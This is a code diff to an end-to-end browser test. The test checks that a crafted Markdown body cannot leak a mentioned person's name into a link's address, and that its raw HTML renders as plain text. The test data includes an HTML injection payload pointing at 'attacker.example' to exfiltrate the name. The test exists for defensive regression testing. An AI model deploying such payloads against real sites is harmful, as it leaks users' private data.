@@ -922,14 +922,19 @@ test('a mention is shown only where Markdown reads a link', async ({ page, reque
   }
 });
 
-test('a text made to swallow a mention into a link’s address names nobody', async ({ page, request }) => {
+test('a text made to swallow a mention into a link’s address is shown with its HTML as text', async ({
+  page,
+  request,
+  otherRequest,
+}) => {
   const stamp = newStamp();
   await wipe(request);
   const ada = await person(request, { display_name: `e2e Ada Secret ${stamp}` });
   // Raw HTML that ends inside an open attribute: to the browser, what
-  // Markdown writes next is that attribute's value. The name would be in
-  // the writer's address. The page checks what it rendered, and shows
-  // the whole text with nobody named.
+  // Markdown writes next is that attribute's value. The name (or, for a
+  // reader told no name, the label) would be in the writer's address.
+  // The page checks what it rendered, and shows such a text with its raw
+  // HTML as text: the mentions are mentions, and the link is no link.
   const body = [
     `Intro ${token(ada, 'A')}.`,
     `<div></a><a href='https://attacker.example/?q=`,
@@ -938,26 +943,51 @@ test('a text made to swallow a mention into a link’s address names nobody', as
     `Outro ${token(ada, 'A')}.`,
   ].join('\n\n');
   const node = await createNode(request, `${NODE} swallowed ${stamp}`, { body });
+  /** Every attribute under the rendered text that holds `word`. */
+  const attributesWith = (word: string) =>
+    page
+      .locator('.prose')
+      .first()
+      .evaluate(
+        (root, w) =>
+          [...root.querySelectorAll('*')]
+            .flatMap((el) => [...el.attributes])
+            .filter((a) => a.name !== 'href' || !a.value.startsWith('/people/'))
+            .filter((a) => a.value.includes(w))
+            .map((a) => `${a.name}=${a.value}`),
+        word,
+      );
   try {
-    // The API does name them: the page is what holds the name back.
     expect(await named(request, node.id)).toEqual([
       { person_id: ada.id, display_name: ada.display_name, mine: true },
     ]);
     await page.goto(`/nodes/${node.id}`);
     const prose = page.locator('.prose').first();
     await expect(prose).toContainText('Intro');
-    await expect(prose.locator('.mention-unresolved').first()).toHaveText('@A');
-    await expect(prose.locator('.mention')).toHaveCount(0);
-    expect(await prose.innerHTML()).not.toContain('Secret');
-    for (const link of await prose.locator('a[href]').all()) {
-      expect(await link.getAttribute('href')).not.toContain('Secret');
-    }
+    // All three are mentions with the name, and the writer's HTML is
+    // words on the page: there is no link of theirs to click.
+    await expect(prose.locator('a.mention[href^="/people/"]')).toHaveCount(3);
+    await expect(prose).toContainText("<div></a><a href='https://attacker.example/?q=");
+    await expect(prose.locator('a[href^="http"]')).toHaveCount(0);
+    expect(await attributesWith('Secret')).toEqual([]);
+
+    // Someone it is shared with: the name as plain text, three times,
+    // and in no attribute.
+    await shareNode(request, node.id, OTHER);
+    await page.setExtraHTTPHeaders({ 'x-e2e-subject': 'other' });
+    await page.goto(`/nodes/${node.id}`);
+    await expect(prose.locator('span.mention')).toHaveCount(3);
+    await expect(prose.locator('a[href^="http"]')).toHaveCount(0);
+    expect(await attributesWith('Secret')).toEqual([]);
+    await page.setExtraHTTPHeaders({});
+
     // The same in the editor's preview.
     await openEditor(page, node.id);
-    await expect(page.locator('.mention-unresolved').first()).toHaveText('@A');
-    await expect(page.locator('a.mention[href^="/people/"]')).toHaveCount(0);
+    await expect(page.locator('a.mention[href^="/people/"]')).toHaveCount(3);
+    await expect(page.locator('.prose a[href^="http"]')).toHaveCount(0);
   } finally {
-    await wipe(request);
+    await page.setExtraHTTPHeaders({});
+    await wipe(request, otherRequest);
   }
 });
 
